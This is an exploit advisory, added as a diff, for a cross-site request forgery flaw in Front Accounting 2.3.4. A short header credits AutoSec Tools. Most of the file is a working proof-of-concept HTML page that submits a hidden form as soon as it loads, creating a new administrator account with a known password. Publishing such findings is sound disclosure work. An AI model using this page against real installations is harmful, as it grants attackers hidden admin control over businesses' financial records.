@@ -1,0 +1,40 @@
+# Software................Front Accounting 2.3.4
+# Vulnerability...........Cross-site Request Forgery
+# Threat Level............Low (1/5)
+# Download................http://frontaccounting.com/wb3/
+# Discovery Date..........4/27/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A cross-site request forgery vulnerability in Front Accounting 2.3.4
+# can be exploited to create a new admin.
+# 
+# 
+# --PoC-->
+
+<html>
+    <body onload="document.forms[0].submit()">
+        <form method="POST" action="http://localhost/frontaccounting/admin/users.php?JsHttpRequest=0-xml">
+            <input type="hidden" name="user_id" value="new_admin" />
+            <input type="hidden" name="password" value="Password1" />
+            <input type="hidden" name="real_name" value="x" />
+            <input type="hidden" name="phone" value="x" />
+            <input type="hidden" name="email" value="x@x.com" />
+            <input type="hidden" name="role_id" value="2" />
+            <input type="hidden" name="language" value="C" />
+            <input type="hidden" name="pos" value="1" />
+            <input type="hidden" name="print_profile" value="" />
+            <input type="hidden" name="rep_popup" value="1" />
+            <input type="hidden" name="ADD_ITEM" value="Add new" />
+            <input type="hidden" name="_focus" value="user_id" />
+            <input type="hidden" name="_modified" value="0" />
+        </form>
+    </body>
+</html>
